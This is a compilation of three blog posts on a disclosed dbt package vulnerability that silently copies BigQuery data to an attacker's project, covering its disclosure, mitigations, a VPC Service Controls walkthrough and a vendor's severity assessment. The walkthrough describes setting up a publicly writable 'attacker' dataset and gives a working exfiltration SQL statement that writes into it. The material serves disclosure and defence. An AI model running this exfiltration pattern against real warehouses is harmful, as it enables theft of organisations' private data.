Within our exploit package’s directory structure is an innocuous-looking file “macros/example.sql”, starting with the following Jinja macro text:

![](data:image/svg+xml...)![](https://www.equalexperts.com/wp-content/uploads/2024/07/AD_4nXcD34lt1_f_P-yMzDfbyVakahhOyc6CLK535nE2KE6bw1LwTXqBof_HF14tHxPOVh94UCj4x3p-G2mvPsE84mypMzveFzIewQtWTGpIMENZeGNJxS3cmbUjJFnHCXFHBAFIqpX6E7rZbgbFdvpUKHShwoo.png)

An unsuspecting victim installs the package from GitHub or dbt Hub. With no further interaction, they execute `dbt run` as usual, or it is run by their automation.

In affected versions of dbt, this macro is run silently in place of the legitimate and [trusted BigQuery adapter’s version](https://docs.getdbt.com/docs/trusted-adapters). **The contents of whatever `SELECT \*` produces against this model (and for each of the set of models included in the run) is copied into a new table in the attacker’s dataset in seconds.** Evidence of the exfiltration would only be present in the dbt log files and GCP audit logging, neither of which would, by default, proactively alert the victim of the attack.

## How to mitigate against this dbt vulnerability

The vendor has provided mitigations for the issue with the config flag [require\_explicit\_package\_overrides\_for\_builtin\_materializations](https://docs.getdbt.com/reference/global-configs/legacy-behaviors#package-override-for-built-in-materialization). The behaviour of this flag varies by versions of dbt core and dbt Cloud, so refer to the [Legacy Behaviours documentation](https://docs.getdbt.com/reference/global-configs/legacy-behaviors) to understand your current position and upgrade options. We offer the following advice for any dbt users to assess and mitigate the risks posed by this vulnerability:

1. Explicitly set the config flag [require\_explicit\_package\_overrides\_for\_builtin\_materializations to True in dbt\_project.yml](https://docs.getdbt.com/reference/global-configs/legacy-behaviors#package-override-for-built-in-materialization) for all your dbt projects.
2. dbt-core versions are Python dependencies. dbt Labs have recently updated their documentation to [making a strong recommendation to keep versions up-to-date](https://docs.getdbt.com/docs/dbt-versions/core). Ensure dbt-core versions are actively updated to the latest versions as these fixes become available, including in [dbt Cloud](https://docs.getdbt.com/docs/dbt-versions/upgrade-dbt-version-in-cloud).
3. Review dbt package usage in your organisation. Ensure packages are obtained from trusted sources like dbt vendor itself, check that the value of a package outweighs the risk.
4. Ensure software dependencies are being scanned for known vulnerabilities, and that you have a vulnerability management process in place to respond to any alarms.
5. Review and minimise permissions that dbt is run with for human and unattended workloads.
6. Review the controls you have in place in your infrastructure that prevent transfer of data outside your organisational boundaries.

These assessments and mitigations can prove challenging to undertake in practice. Equal Experts has published a [Secure Delivery Playbook with lots of advice for applying security principles](https://playbooks.equalexperts.com/secure-delivery-playbook). I’ve also shared the practices I follow to [assess the risk a package represents](https://tempered.works/posts/2024/05/01/how-i-do-python-data-supply-chain-security/#assessing-dependency-risk) and to [automatically update dependencies without causing chaos in my teams](https://tempered.works/posts/2024/05/01/how-i-do-python-data-supply-chain-security/#updating-dependencies-automatically).

## You may also like

Previous

Next

![](data:image/svg+xml...)![](https://www.equalexperts.com/wp-content/uploads/2020/01/For-StuartGunter-Blog-Jan-2020-Thumbnail.jpg)
### Blog

Cybersecurity Strategy and the Secure Delivery Playbook

![](data:image/svg+xml...)![](https://www.equalexperts.com/wp-content/uploads/2023/10/cloud-secutity-feature.jpg)

### Case Study

Plan for the future with a tailored security health check

![](data:image/svg+xml...)![](https://www.equalexperts.com/wp-content/uploads/2023/10/290923-Feature-Image.jpg)

### Case Study

Reducing time-to-market in security architecture

## Get in touch

#### Solving a complex business problem? You need experts by your side.

All business models have their pros and cons. But, when you consider the type of problems we help our clients to solve at Equal Experts, it’s worth thinking about the level of experience and the best consultancy approach to solve them.

If you’d like to find out more about working with us – get in touch. We’d love to hear from you.

* [About us](https://www.equalexperts.com/about-us/)
* [Experience model](https://www.equalexperts.com/about-us/the-equal-experts-experience-model/)
* [Consultant network](https://www.equalexperts.com/about-us/consultant-network/)
* [Equal Experts Trust](https://www.equalexperts.com/about-us/equal-experts-trust/)
* [Our team](https://www.equalexperts.com/about-us/our-team/)

* [Design](https://www.equalexperts.com/our-services/design/)
* [Data](https://www.equalexperts.com/our-services/data/)
* [AI](https://www.equalexperts.com/our-services/ai/)
* [Deliver](https://www.equalexperts.com/our-services/deliver/)
* [Scale](https://www.equalexperts.com/our-services/scale/)

* [Blog](https://www.equalexperts.com/blog/)
* [Playbooks](https://www.equalexperts.com/playbooks/)
* [Events](https://www.equalexperts.com/events/)
* [Case studies](https://www.equalexperts.com/case-studies/)
* [Network blogs](https://www.equalexperts.com/network-blogs/)

* [Join us](https://www.equalexperts.com/join-us/)
* [Current opportunities](https://www.equalexperts.com/current-opportunities/)
* [Network benefits](https://www.equalexperts.com/join-us/network-benefits/)
* [Our Values](https://www.equalexperts.com/about-us/our-values/)
* [Contact us](https://www.equalexperts.com/contact-us/)

* [Privacy and cookies notice](https://www.equalexperts.com/privacy-notice/)
* [Modern Slavery Policy](https://www.equalexperts.com/modern-slavery-policy/)
* [Equality, Diversity and Inclusion](https://www.equalexperts.com/equality-diversity-inclusion/)
* [Carbon Reduction Plan](https://www.equalexperts.com/carbon-reduction-plan/)

[link to X
![x](data:image/svg+xml...)![x](https://www.equalexperts.com/wp-content/uploads/2024/10/X-Icon.svg)](https://x.com/EqualExperts)
[link to linkedin
![linkedin](data:image/svg+xml...)![linkedin](https://www.equalexperts.com/wp-content/uploads/2024/10/LinkedIn-Icon-min.svg)](https://www.linkedin.com/company/equal-experts/)
[link to Youtube
![youtube](data:image/svg+xml...)![youtube](https://www.equalexperts.com/wp-content/uploads/2024/10/Youtube-Icon.svg)](https://www.youtube.com/user/EqualExperts)



=== Content from tempered.works_c3839aaa_20250110_152651.html ===


[Skip to content](#exfiltration-to-writable-attacker-dataset)

[![logo](../../../../../favicons/favicon-32x32.webp)](../../../../.. "Tempered Works Ltd.")

Tempered Works Ltd.

Preventing data theft with GCP service controls

Initializing search

* [Home](../../../../..)
* [Company](../../../../../company/)
* [Portfolio](../../../../../portfolio/)
* [Archive](../../../../../archive/2024/)
* [Categories](../../../../../category/automation/)

[![logo](../../../../../favicons/favicon-32x32.webp)](../../../../.. "Tempered Works Ltd.")
Tempered Works Ltd.

* [Home](../../../../..)
* [Company](../../../../../company/)

  Company
* [Portfolio](../../../../../portfolio/)

  Portfolio
* Archive

  Archive
  + [2024](../../../../../archive/2024/)
  + [2023](../../../../../archive/2023/)
  + [2020](../../../../../archive/2020/)
  + [2019](../../../../../archive/2019/)
  + [2018](../../../../../archive/2018/)
* Categories

  Categories
  + [Automation](../../../../../category/automation/)
  + [Contracts](../../../../../category/contracts/)
  + [Insights](../../../../../category/insights/)
  + [Operations](../../../../../category/operations/)
  + [Performance](../../../../../category/performance/)
  + [Python](../../../../../category/python/)
  + [Security](../../../../../category/security/)

Table of contents

* [Exfiltration to writable attacker dataset](#exfiltration-to-writable-attacker-dataset)
  + [Demo overview](#demo-overview)
  + [Attacker setup](#attacker-setup)
  + [Victim default setup](#victim-default-setup)
* [VPC service controls](#vpc-service-controls)
  + [What are VPC service controls and perimeters?](#what-are-vpc-service-controls-and-perimeters)
  + [Target protections](#target-protections)
  + [Create perimeter](#create-perimeter)
  + [Test the perimeter](#test-the-perimeter)
  + [Two projects in a perimeter](#two-projects-in-a-perimeter)
* [Summary](#summary)

[Back to index](../../../../..)

![Paul Brabban](../../../../../assets/external/1.gravatar.com/avatar/052225bfc8d9e6c9f711e567cedd16b8500843420ebd129f68365e6a6846a801.2b33694f.jpg)

**Paul Brabban**

Consultant

* Metadata

  + Jul 6, 2024
  + in
    [Security](../../../../../category/security/),
    [Operations](../../../../../category/operations/)
  + 10 min read

# Preventing data theft with GCP service controls

![The error message indicating that VPC service controls are protecting](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/controls_protecting.webp)

I recently discovered and responsibly disclosed [a vulnerability in the dbt analytics engineering solution](https://www.equalexperts.com/blog/tech-focus/are-you-at-risk-from-this-critical-dbt-vulnerability/). Google Cloud services are my default choice to process data, so I looked into how I could protect myself from data theft when I'm using BigQuery.

* Thanks to [![Equal Experts logo](../../../../../assets/images/equal-experts-logo-colour-100px.webp)](https://equalexperts.com) for supporting this content.

## Exfiltration to writable attacker dataset[¶](#exfiltration-to-writable-attacker-dataset "Permanent link")

Note

The vulnerability I disclosed is related to how dbt processes packages. The risks and controls this post talks about go far beyond that though. They protect against attackers that have coerced a legitimate user to run their malicious code, including but not limited to SQL. They also protect against malicious insiders and plain old mistakes.

The idea behind exfiltration by this vulnerability is to covertly get a victim to run malicious SQL on the attacker's behalf. The victim has read access to sensitive data, and that data is copied out to the attacker's public-writable dataset, in a different GCP project. I don't see any way for the defender's IAM controls to prevent it. The solution seems to be [VPC Service Controls](https://cloud.google.com/vpc-service-controls/docs/overview). In those docs:

> To mitigate data exfiltration risks, your organization might also want to ensure secure data exchange across organizational boundaries with fine-grained controls. As an administrator, you might want to ensure the following:

Well... yes. It sure would be nice if you could stop data from being stolen from your projects! The good news is that VPC service controls can [prevent exfiltration from more services than just BigQuery](https://cloud.google.com/vpc-service-controls/docs/overview#how-vpc-service-controls-works). The bad news is that there's no protection by default and the feature doesn't seem very straightforward to use.

### Demo overview[¶](#demo-overview "Permanent link")

I don't believe it 'til I see it work, so here's a demo of the problem, independently of tooling like dbt. It's the same setup I used in the disclosure article.

```
graph LR

    subgraph def_org [Victim Organisation]
        subgraph def_act [victim-project]
            subgraph def_ds [Victim_Dataset]
                Sensitive_Table
            end
        end
    end

    subgraph att_act [attacker-project]
        subgraph att_ds [attacker_dataset]
            Sensitive_Table_Copy
        end
    end

    Sensitive_Table -->|CREATE TABLE AS...| Sensitive_Table_Copy
```
### Attacker setup[¶](#attacker-setup "Permanent link")

Note

My initial exploration as I share it here uses the point-and-click console interface. To avoid any confusion, I'd recommend infrastructure as code and related good practices over point and click in an implementation that needs to be robust and reliable. That can be a big lift, especially for smaller organisations. Where that's the case, I'd say a bit of documentation and pointy-clicky steps still beats doing nothing!

The attacker has a standard GCP account. My attacker project is a [BigQuery sandbox account, no credit card needed](https://cloud.google.com/bigquery/docs/sandbox). I create a project with the id `attacker-project-428619` as normal. Enter the project's BigQuery console and create a dataset.

![BigQuery console showing create panel for attacker_dataset in the US multi-region](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_attacker_bq_ds_create.webp)

Creating the attacker dataset in the US multi-region

Next, I share the new dataset with the `allUsers` security principal, with the `data editor` role. This role allows anyone to create tables in this dataset.

![BigQuery console showing share panel for attacker_dataset granting Data Editor to allUsers](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_attacker_bq_ds_share.webp)

Allowing anyone to create tables the attacker dataset

I think it's true that this dataset can now receive data from any BigQuery job, running in any other GCP project in the same region. The IAM permissions on the victim side are irrelevant. The other account needs a VPC service perimeter set up to prevent exfiltration. By default, they do not have one. I'll switch to my other GCP account to give it a try!

### Victim default setup[¶](#victim-default-setup "Permanent link")

I create a new project with default settings - so I specify the name. This is my Tempered Works Ltd. company account, so I have an organisation here.

![GCP resources view showing victim-project as a child of the organisation tempered.works](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_victim_bq_project.webp)

victim-project is a child of org tempered.works by default

I need to enable the BigQuery API to enter the project in the BigQuery console. Can I create a table in the attacker's dataset? I'll do the simplest thing I can:

```
CREATE OR REPLACE TABLE `attacker-project-428619.attacker_dataset.leak_it`
AS
SELECT 1 AS dummy

```

![BigQuery showing the SQL query and a successful status, with an exclamation next to the success indicator](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_victim_bq_leak.webp)

A table leaks from victim-project to attacker-project without any permissions victim-side

Is it really there? Oh yes.

![The leaked table and content in the attacker's dataset](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_attacker_bq_leak.webp)

The leaked table on the attacker's side

I remember when I saw this whilst experimenting with the dbt-based attack back in Feb. I expected **something** to stop the table appearing in the attacker's project. The wave of nausea when nothing did and I realised how easy it was.

I don't think it matters that the data in this simple demo isn't coming from a real table, so I won't waste time on more examples. I'm confident that anything the victim has permission to query can be exfiltrated this way. BigQuery tables, [federated queries](https://cloud.google.com/bigquery/docs/federated-queries-intro), [external tables](https://cloud.google.com/bigquery/docs/external-tables), anything.

## VPC service controls[¶](#vpc-service-controls "Permanent link")

I'll walk you through what I did to prove that these security features can prevent this exploit.

Note

I needed lots of privileges to do any of this. I suspect the typical users or admins of a GCP project won't have any ability to do this stuff, perhaps not even to see it. In that case, I hope this information gives you enough insight to have a productive interaction with your GCP admins!

### What are VPC service controls and perimeters?[¶](#what-are-vpc-service-controls-and-perimeters "Permanent link")

[VPC service controls](https://cloud.google.com/vpc-service-controls/docs/overview) can prevent this exfiltration. They work at the level of GCP API calls, and allow you to control what API calls are allowed to enter (ingress) or leave (egress) your project. I found it quite tricky to get my head around and set up but got it working effectively. At least, I got it working well enough to block this specific scenario!

The [secure data exchange with ingress and egress rules guide](https://cloud.google.com/vpc-service-controls/docs/secure-data-exchange) is probably the next useful resource - I want to apply egress rules to prevent API calls being made from my GCP project across a "service perimeter" that encompasses the projects that should be able to talk to one another. For this demo, I'll only have the victim project inside the perimeter. My next question - what's a service perimeter? Here's a [service perimeter overview](https://cloud.google.com/vpc-service-controls/docs/service-perimeters).

A lot is going on here. I had expected to find an automatic perimeter around the organisation that I could just check a box to say "prevent this project from interacting with anything outside its organisation". I appreciate that there will be much more complex needs in many larger organisations, but that seemed like a sensible default. I couldn't find anything so straightforward.

### Target protections[¶](#target-protections "Permanent link")

Referring back to the previous diagram, this is the difference in what I'm trying to create.

```
graph LR

    subgraph def_org [Organisation]
        subgraph victim_sp [Security Perimeter]

        egress_rule

            subgraph def_act [victim-project]
                subgraph def_ds [Victim_Dataset]
                    Sensitive_Table
                end
            end
        end
    end

    Sensitive_Table --x|CREATE TABLE AS...| egress_rule
```

The security perimeter can be a "folder" in the organisational structure that contains an egress rule to prevent BigQuery calls across the perimeter - or it can be scoped to the organisation itself.

### Create perimeter[¶](#create-perimeter "Permanent link")

Originally I set up a folder in the org and attached a service perimeter to that. I think I want a perimeter around the whole tempered.works organisation. I didn't think it was obvious how to do that, but I stumbled across it as I wrote this article!

First, I open the `VPC Service Controls` page. It's in the `Security` section.

![Initial empty view of VPC service controls for org tempered.works](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_perim_1.webp)

Opening VPC service controls

I hit `MANAGE POLICIES`, then `CREATE`. I give the access policy a title - I've used `test` for this demo. I leave the included resources section empty (this is the part that makes it org-scoped!) and add my GCP super admin account as `Access Context Manager admin`.

![The access policy settings panel](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_perim_2_ap.webp)

The access policy settings panel

Note

As part of these investigations, I realised I was actually using the super-admin account like a personal account. It was a bit of a pain to sort that out, and it costs money to have a second account that functions as super-admin. It means I'm only logging onto credentials with the power to, for example, drop this service perimeter protection, when I need that power. When I'm just using GSuite or GCP eg. to work on something in BigQuery, I can use my personal account instead.

Next, I select the `test` policy and then hit `NEW PERIMETER`.

![Controls to add a perimeter in the console](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_perim_3.webp)

Controls to add a perimeter

Now, a complicated form to fill in. Steps are:

* give it a title - I'll call mine `test-perimeter`
* leave it as a regular perimeter
* in `Restricted services` add all services
* in `VPC accessible services` select `No services`
* in `Ingress policy`, add a rule
  + FROM
    - Any identity
    - All sources
  + TO
    - All projects
    - All services
* `Create perimeter`

My understanding is that restricts all services from any project in the org, that is explicitly added to this perimeter, from egressing across the perimeter. I've added an ingress rule to allow any user or service account to make calls into the perimeter - without some ingress rule, you can't do anything. I'm pretty sure this loose ingress rule leaves me no worse off than I was with no perimeter at all so I'm fine with it - it's the egress I'm worried about.

### Test the perimeter[¶](#test-the-perimeter "Permanent link")

If I go back to the victim project, I can still run the exfiltration query. I need to go back into `test-perimeter` and add `victim-project` as a resource to protect. Don't forget to save! I do that and give it a few seconds before heading back to run the exfil query again...

This time, I got a big red error in the results panel `VPC Service Controls: Request is prohibited by the organisation's policy. vpcServiceControlsUniqueIdentifier: ....`

![Red error message when the exfiltration query is attempted](../../../../../2024-07-06-preventing-data-theft-with-gcp-service-controls/assets/vpcsc_perim_4.webp)

Exfiltration query now fails

I can still run normal SQL queries inside the project, but I can't access any resources outside the project, including querying other data in my organisation!

### Two projects in a perimeter[¶](#two-projects-in-a-perimeter "Permanent link")

I suspect the policy as it stands is too restrictive to be useful, as I can't query any datasets from other projects in the org as it stands. It seems that a pragmatic starting point for a simple organisation like this is a perimeter around the org into which I can put projects so that they can interact with one another but not the outside world. This seems to be a straightforward update to my setup.

I go back and add a second project `other-project` to my organisation `test` perimeter. Then, I update the `VPC accessible services` to `all services`. After a minute to settle, I try a few experiments from `victim-project`. I am running as the owner of the projects that are in my orgnisation, so IAM will allow it, only VPC service controls can stop it.

| Test | SQL | Result |
| --- | --- | --- |
| query a table in a dataset in `other-project`? | `SELECT * FROM other-project.example.test` | Yes |
| query a table in a dataset in `pypi-vulns`, in my org but outside the perimeter? | `SELECT COUNT(1) FROM pypi-vulns.published_us.vulnerable_downloads_overall` | No, prohibited by policy |
| query a table in `bigquery-public-data`? | `SELECT COUNT(1) FROM bigquery-public-data.usa_names.usa_1910_2013` | No, prohibited by policy |
| exfiltrate to `attacker-project`? | `CREATE OR REPLACE TABLE attacker-project-428619.attacker_dataset.leak_it AS SELECT 1 AS dummy` | No, prohibited by policy |

Note

Even if you don't have permissions to see the VPC service controls in your organisation, you can tell whether they are in place by the errors you get back when you try to access resources you shouldn't be able to access. Errors like `VPC Service Controls: Request is prohibited by the organisation's policy.` mean that a perimeter prevented the action. IAM permissions errors indicate that a service perimeter did **not** prevent the action.

This seems like a decent starting point!

> Shout-out to this [Medium article giving a more IaC treatment, that mentioned how to use the identifier provided with deny messages to see why it was denied](https://medium.com/%40bigface00/guarding-bigquery-enhancing-data-security-with-vpc-service-control-cd2fb37094a2). Very useful facility!

## Summary[¶](#summary "Permanent link")

My goals here were:

* to make sure I could use these controls ![✅](../../../../../assets/external/cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg ":white_check_mark:")
* to be confident that these controls really can prevent the exfiltration risk from BigQuery ![✅](../../../../../assets/external/cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg ":white_check_mark:")
* to be confident that these controls can mitigate the exfiltration with in the dbt vulnerability in BigQuery ![✅](../../../../../assets/external/cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg ":white_check_mark:")
* to get an idea how I might use these controls in practice ![✅](../../../../../assets/external/cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg ":white_check_mark:")

Thanks to [Jenna Jordan](https://www.linkedin.com/in/jennajordan1/) and [Maayan Salom](https://www.linkedin.com/in/maayansa/) for sharing their perspectives and prompting me to write this up. [The disclosure on the dbt Slack](https://getdbt.slack.com/archives/C01NH3F2E05/p1720001546356899) produced a great thread of different perspectives and some starting points for thinking about the same risks on other platforms.

---

Feedback

If you want to get in touch with me about the content in this post, you can find me on [LinkedIn](https://www.linkedin.com/in/paulbrabban) or [raise an issue](https://github.com/brabster/tw-site-mkdocs/issues)/[start a discussion](https://github.com/brabster/tw-site-mkdocs/discussions) in the GitHub repo. I'll be happy to credit you for any corrections or additions!

If you liked this, you can find content from other great consultants on the [Equal Experts network blogs page](https://www.equalexperts.com/network-blogs/) ![🎉](../../../../../assets/external/cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f389.svg ":tada:")

[Previous

Latest and historical state from change data capture](../../../06/28/latest-and-historical-state-from-change-data-capture/)
[Next

Map over an array in BigQuery](../../31/map-over-an-array-in-bigquery/)

Copyright © 2018 - 2024 Paul Brabban.
Views expressed are my own and may not represent those of my employer or other associated entity.

Made with
[Material for MkDocs Insiders](https://squidfunk.github.io/mkdocs-material/)



=== Content from www.elementary-data.com_5d559b58_20250110_152651.html ===
[Elementary mentioned in **Gartner**'s Market Guide for Data Observability Tools](https://www.gartner.com/en/documents/5533895)[![Elementary logo](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66479a11699c86d73776dab7_Type%3DLogo%2C%20On%20Dark%3DNo.svg)](/)[![Elementary icon](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/67092559cf4504398d71af98_Type%3DLogomark%2C%20On%20Dark%3DNo.svg)](/)[Book a demo](/schedule-a-call)[![Elementary logo](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66479a11699c86d73776dab7_Type%3DLogo%2C%20On%20Dark%3DNo.svg)](/)[![Elementary icon](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/67092559cf4504398d71af98_Type%3DLogomark%2C%20On%20Dark%3DNo.svg)](/)[Product](/product)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/6653798328b0d4ab690d6de8_automated-monitors.svg)Automated monitors](/product#automated-monitors)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66537983498734a943562dd4_anomaly-detection.svg)Anomaly detection](/product#anomaly-detection)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/6653798437d92f0316425340_column-level-lineage.svg)Column-level lineage](/product#lineage)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66537987fac1df87b3400a0b_data-tests.svg)Data tests](/product#tests)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66537983541e31ea67dd34fd_alerts.svg)Alerts](/product#alerts)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66537987f5f3fb273ca485b7_data-quality-dashboard.svg)Data quality dashboard](/product#quality)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/665379865a153a2510275a92_performance-and-cost.svg)Performance and cost](/product#performance)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66537983fa1b034d53504789_data-ci-cd.svg)Data CI/CD](/product#ci-cd)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66537983ff8b37e9a3ecdb8d_code-first.svg)Code-first](/product#code-first)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/6653798693b4e05bcda30730_integrations.svg)Integrations](/integrations)[Automated Monitors

Freshness, volume and schema changes for all production tables](/product#automated-monitors)Resources

[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66537ce8da2f321150a6ac76_blog.svg)Blog](/blog)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/66537dddd19cc411b09ab949_dbt-test-hub.svg)dbt Test Hub](/dbt-test-hub)[![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/670f98f75796e064e2d969b8_video.svg)Videos and Webinars](/videos)[Docs](https://docs.elementary-data.com/introduction)[Community](https://www.elementary-data.com/community)[Customers](/customer-stories)[Pricing](/pricing)[Start free](https://elementary-data.frontegg.com/oauth/account/sign-up)[Book a demo](/schedule-a-call)dbt
# Are dbt packages secure? The answer lies in your DWH policies

In light of the recent publication of a dbt vulnerability, what are the risks and security implications of using dbt packages, and the real data breach risk in your data platform?

![](https://cdn.prod.website-files.com/6600900f6b80d2b70b387dc4/668ab751090a6270472ec34f_dbt%20packages%20security.png)![](https://cdn.prod.website-files.com/6600900f6b80d2b70b387dc4/6641de88e3b88c2a713bba34_1675957476213.jpeg)Maayan SalomCo-Founder at ElementaryShare to![Linkedin logo](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1821b202eeacc6f10160_linkedin.svg)![Facebook logo](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1820a4a3293c33d64856_Facebook.svg)![Twitter logo](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822c7531e8168cee7fc_Twitter.svg)Example H2Example H3Example H4Example H5Example H6

**In light of the recent publication of a dbt vulnerability, what are the risks and security implications of using dbt packages, and the real data breach risk in your data platform?**â

On May 3rd, the dbt team opened [an issue](https://github.com/elementary-data/dbt-data-reliability/issues/703) on the [Elementary dbt package](https://github.com/elementary-data/dbt-data-reliability) repository, to notify us of a planned breaking change. Two months later, we learned what lead to this change, when [Paul Brabban](https://www.linkedin.com/in/paulbrabban/) published a post titled â[Are you at risk from this critical dbt vulnerability?](https://www.equalexperts.com/blog/tech-focus/are-you-at-risk-from-this-critical-dbt-vulnerability/)â.

A headline like that can definitely make you sit up and take notice, especially as this happened not long after publications on a [significant Snowflake breach](https://www.wired.com/story/snowflake-breach-advanced-auto-parts-lendingtree/). We got tons of questions from Elementary users following this post and the change dbt deployed. Before we all start panicking, letâs dive into the context and implications of this alleged critical dbt vulnerability.

Following a [discussion on the dbt Slack](https://getdbt.slack.com/archives/C01NH3F2E05/p1720001546356899), I want to break down my take on it, what it means for companies using dbt, and security practices in your data platform as a whole.

Think of it as turning a potential "oh no" moment into a chance to level up our data game and understand the security aspects of it.

## Iâm a security expert and dbt package maintainerÂ

As someone who knows how sensitive data is for our customers, I get it â security issues are no joke. In fact, I personally know how serious security vulnerabilities are. My background is in security research, and before starting Elementary I was leading Cyber Security Incident Response engagements at an elite security consulting firm.

For more than 4 years I was knee-deep in investigating and responding to attacks on various companies, including Fortune 500, that resulted in millions of dollars in damages. Many of these attacks included malicious access to databases and data exfiltration.

All of these organizations invested heavily in data protection and followed security best practices. So why were they still vulnerable? Because ultimately, security involves making tradeoffs.

## Tradeoffs between usability, resources, and security

I often tell customers they can achieve a data platform without data issues. Easily. Donât ingest new data, and donât build any new data pipelines and products. If you actually leverage data, you are bound to have problems.Â

Security is the same. If you try to create a fully secure system, it will probably also be unusable and irrelevant.
Zooming in on data platforms - It is probably safer not to give ingestion tools like Fivetran, Stitch, and Airbyte credentials to read sensitive data from all of our internal databases and 3rd party vendors. It also isnât the best idea in the world to give a BI tool access to read and store all of our data.Â

But we do it because otherwise, we couldnât create a useful data platform with reasonable resources. Some will decide to invest in risk reduction, like paying for an on-prem deployment. But these are still tradeoffs between usability, resources, and security.
In theory, your data platform can be a silo, without interfaces open to users and vendors. It might not have vulnerabilities, but will it still be useful and valuable?

So should we just give up and accept it? Of course not.Â
Our focus should be on understanding if we have critical vulnerabilities.

## What makes a vulnerability critical?

There is a [standard for scoring](https://www.first.org/cvss/v3.1/specification-document) the severity of vulnerabilities (CVSS) with a score between 0.1 to 10, 9-10 would mean a critical vulnerability. It takes into account different factors, that I can simplify and summarize - how probable is it for an attacker to exploit the vulnerability, and what would be the impact?

## dbt packages - security implications and the recently published vulnerability

Iâm no vulnerabilities scoring professional, but Iâll share my humble opinion, as one of the developers of a very popular dbt package, and a former security expert.

**Yes, Iâm finally addressing the reported vulnerability.**
Public dbt packages are open-source code packages you can import to your dbt code. Once you import a package, it becomes part of your code base. Importing external packages is a common practice in software development that introduces [security risks](https://snyk.io/series/open-source-security/).Â

In dbt packages specifically, code of the package is often executed by default as part of your dbt commands. This means code written by the package creators (and contributors) is executed as part of your dbt runs, with dbtâs production user permissions.

This is the vulnerability described in the post. The scenario in the post describes a malicious override of materialization. The change introduces in dbt 1.8 is that overriding the materialization from a package requires a flag, but there are various other methods to exploit. If the package includes hooks or models, these will be executed unless you explicitly exclude them. If the package introduces macros that override dbtâs default ones (same as materializations), the package macros will be executed.

But here is a significant context: What code can be included in and executed by a dbt package? Only valid SQL commands, that the user running dbt is permitted to run.

As part of the attack scenario in the post, the malicious materialization code includes an SQL command to write the victim's tables to a public Bigquery database. This is the exfiltration of private data, so a full data breach attack vector.

## Is this dbt package vulnerability critical? Not on its own

What will need to happen for an attacker to exploit this vulnerability on your data platform?Â

1. **Including malicious code in a dbt package** - The attacker will need to make a contribution of malicious code to a public dbt package, or publish a new dbt package.Â some text
   1. Creating a new dbt package - High effort - will require building value for users so they actually download it.Â
   2. Making a contribution - The malicious code will need to pass the review of the package maintainers.Â
2. dbt will accept the code to dbt hub - Similar to other hubs, [dbt doesnât guarantee packages security](https://hub.getdbt.com/disclaimer/).Â
3. **A user would need to download the malicious package and deploy it to production** - Different organizations have different policies here. Can any user introduce any package? Will it run in dev first? Who will need to approve this step?
4. **The dbt user running the package will need permission to execute the malicious command**â
   1. In my opinion, this is the most important piece. The permissions will determine the potential impact of the attack.

Letâs evaluate using [CVSS metrics](https://www.sans.org/blog/what-is-cvss/), addressing probability and impact:

**Exploit probability**

* **Local attack vector** - This means no network access. The attacker will at no point gain direct access to data warehouse. It will rely on the code that is executed locally.Â
* **Required user interaction** - At the very least, the attacker relies on a user to download the package. More likely, it also relies on package maintainers to accept the contribution, and on someone beyond the user to approve the deployment of the package to production.
* **High attack complexity** - Defined as âA successful attack depends on conditions beyond the attacker's controlâ. In this case, itâs the required user interactions and permissions of the dbt user.

These factors make the vulnerability exploitability low.Â

But what will determine the impact?
The answer is the complicated, borderline impossible-to-understand, permissions structure of your data warehouse.

## Data warehouse permissions - the real vulnerability in your stack

In the scenario described in the post, the dbt user has permission and access to write the organization's private data to a public Bigquery project.Â
By default, any users with read access permissions to data can do this. I know, this is crazy.Â

**This is a known vulnerability.Â**

Known to who? To Bigquery.
Their [paid threat detection service](https://cloud.google.com/security-command-center/docs/concepts-event-threat-detection-overview) will alert you on such actions, as potential âBigquery data exfiltrationâ.

[![](https://cdn.prod.website-files.com/6600900f6b80d2b70b387dc4/668aa8ca52e206222084c5cc_AD_4nXe-bDdbAR_QJnZfxtVglS6q672jTa3fe0Pg_gCsiCEf9Z0El1BfgQtrKHlSQoC6jTd0y-73aG12pYudnDoNtqfte0FizGKjbHCXgMH311bIj2YWYFenAHU9VpNhGev6LPxAsXK_fu--hLslLgh8FP4-PtdV.png)](https://getdbt.slack.com/archives/C01NH3F2E05/p1720001546356899)

